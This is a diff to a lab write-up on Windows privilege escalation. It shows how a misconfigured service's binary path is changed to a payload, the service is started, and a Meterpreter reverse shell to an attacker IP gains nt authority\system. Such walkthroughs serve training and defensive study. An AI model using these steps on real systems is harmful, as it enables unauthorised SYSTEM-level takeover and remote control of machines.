@@ -403,6 +403,37 @@ sc config daclsvc binpath= "C:\PrivEsc\privesc.exe"
 [SC] ChangeServiceConfig SUCCESS
 ```
 
+|------Field--------|-----------------------Before-------------------|---------------After--------|
+|BINARY_PATH_NAME   |C:\Program Files\DACL Service\daclservice.exe   |C:\PrivEsc\privesc.exe      |
+
 <p align="center">
   <img src="/writeups/Windows-Privilege-Escalation/insecure service configuration/images/step11-2.png" width="600">
 </p>
+
+## Step 12 — Starting the Service and Getting a SYSTEM Shell
+
+Started the Service
+
+```bash
+C:\PrivEsc> net start daclsvc
+```
+
+Metasploit Caught the SYSTEM Shell
+
+```
+[*] Meterpreter session 1 opened (192.168.5.128:9001 -> 192.168.5.129:60971) at 2026-06-18 08:03:48 -0400
+```
+
+```bash
+meterpreter > shell
+```
+```bash
+C:\Windows\system32>whoami
+nt authority\system
+```
+Attacker IP: `192.168.5.128`
+Victim IP: `192.168.5.129`
+Port: `9001`
+Privilege: `nt authority\system`
+
+I went from a normal low privilege user account all the way to nt authority\system just by changing the binary path of a misconfigured service.
